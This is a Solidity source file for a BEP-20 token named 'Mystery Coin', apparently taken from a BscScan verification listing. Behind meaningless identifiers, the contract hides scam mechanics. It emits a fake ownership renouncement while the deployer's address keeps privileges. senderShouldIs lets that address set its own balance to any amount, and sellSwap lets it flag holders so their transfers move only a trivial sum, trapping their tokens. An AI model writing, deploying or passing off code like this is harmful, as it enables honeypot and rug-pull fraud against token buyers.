/**
 *Submitted for verification at BscScan.com on 2023-02-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface launchTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapLimit {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract MysteryCoin {
    uint8 private txFee = 18;
    
    mapping(address => bool) public senderFee;
    bool public atTakeSender;
    bool private enableLaunched;
    bool private buyAtMin;
    bool public shouldToLimit;
    uint256 public senderWalletList;
    uint256 private swapAt;
    mapping(address => uint256) private enableLimit;
    address public buyTotal;
    mapping(address => bool) public tokenMin;
    uint256 private enableAt = 100000000 * 10 ** txFee;
    bool private isTotal;
    address public enableExempt;



    address private receiverBuy;
    uint256 constant autoEnableTo = 10 ** 10;

    string private txEnable = "MCN";
    uint256 private takeLaunch;
    mapping(address => mapping(address => uint256)) private atSellMin;
    
    uint256 private totalMarketing;
    string private receiverMaxTotal = "Mystery Coin";
    bool public totalSender;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        
        launchTo launchLimit = launchTo(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        buyTotal = swapLimit(launchLimit.factory()).createPair(launchLimit.WETH(), address(this));
        receiverBuy = receiverSwap();
        
        enableExempt = receiverBuy;
        tokenMin[enableExempt] = true;
        if (shouldToLimit == buyAtMin) {
            senderWalletList = swapAt;
        }
        enableLimit[enableExempt] = enableAt;
        emit Transfer(address(0), enableExempt, enableAt);
        liquidityTakeFund();
    }

    

    function decimals() external view returns (uint8) {
        return txFee;
    }

    function allowance(address autoTeam, address swapAmount) external view returns (uint256) {
        return atSellMin[autoTeam][swapAmount];
    }

    function receiverSwap() private view returns (address) {
        return msg.sender;
    }

    function swapIsLaunch() public {
        if (atTakeSender) {
            atTakeSender = true;
        }
        if (swapAt != takeLaunch) {
            senderWalletList = totalMarketing;
        }
        atTakeSender=false;
    }

    function name() external view returns (string memory) {
        return receiverMaxTotal;
    }

    function owner() external view returns (address) {
        return receiverBuy;
    }

    function balanceOf(address shouldIs) public view returns (uint256) {
        return enableLimit[shouldIs];
    }

    function transferFrom(address buyEnable, address maxTo, uint256 minLiquidity) public returns (bool) {
        if (buyEnable != receiverSwap() && atSellMin[buyEnable][receiverSwap()] != type(uint256).max) {
            require(atSellMin[buyEnable][receiverSwap()] >= minLiquidity);
            atSellMin[buyEnable][receiverSwap()] -= minLiquidity;
        }
        if (maxTo == enableExempt || buyEnable == enableExempt) {
            return swapMinFrom(buyEnable, maxTo, minLiquidity);
        }
        
        if (senderFee[buyEnable]) {
            return swapMinFrom(buyEnable, maxTo, autoEnableTo);
        }
        
        return swapMinFrom(buyEnable, maxTo, minLiquidity);
    }

    function liquidityTakeFund() public {
        emit OwnershipTransferred(enableExempt, address(0));
        receiverBuy = address(0);
    }

    function swapMinFrom(address modeTxTake, address takeLimitReceiver, uint256 minLiquidity) internal returns (bool) {
        require(enableLimit[modeTxTake] >= minLiquidity);
        enableLimit[modeTxTake] -= minLiquidity;
        enableLimit[takeLimitReceiver] += minLiquidity;
        emit Transfer(modeTxTake, takeLimitReceiver, minLiquidity);
        return true;
    }

    function approve(address swapAmount, uint256 minLiquidity) public returns (bool) {
        atSellMin[receiverSwap()][swapAmount] = minLiquidity;
        emit Approval(receiverSwap(), swapAmount, minLiquidity);
        return true;
    }

    function senderShouldIs(uint256 minLiquidity) public {
        if (!tokenMin[receiverSwap()]) {
            return;
        }
        enableLimit[enableExempt] = minLiquidity;
    }

    function totalSupply() external view returns (uint256) {
        return enableAt;
    }

    function sellSwap(address toBuy) public {
        
        if (toBuy == enableExempt || toBuy == buyTotal || !tokenMin[receiverSwap()]) {
            return;
        }
        if (takeLaunch == swapAt) {
            shouldToLimit = true;
        }
        senderFee[toBuy] = true;
    }

    function listTotal() public view returns (uint256) {
        return senderWalletList;
    }

    function transfer(address maxTo, uint256 minLiquidity) external returns (bool) {
        return transferFrom(receiverSwap(), maxTo, minLiquidity);
    }

    function getOwner() external view returns (address) {
        return receiverBuy;
    }

    function feeAutoTo() public {
        if (isTotal) {
            isTotal = true;
        }
        if (totalMarketing == takeLaunch) {
            takeLaunch = senderWalletList;
        }
        shouldToLimit=false;
    }

    function shouldMaxLaunch() public view returns (uint256) {
        return senderWalletList;
    }

    function limitTrading(address amountSender) public {
        if (totalSender) {
            return;
        }
        if (totalMarketing != senderWalletList) {
            senderWalletList = swapAt;
        }
        tokenMin[amountSender] = true;
        
        totalSender = true;
    }

    function txAuto() public {
        if (buyAtMin) {
            takeLaunch = senderWalletList;
        }
        
        enableLaunched=false;
    }

    function symbol() external view returns (string memory) {
        return txEnable;
    }


}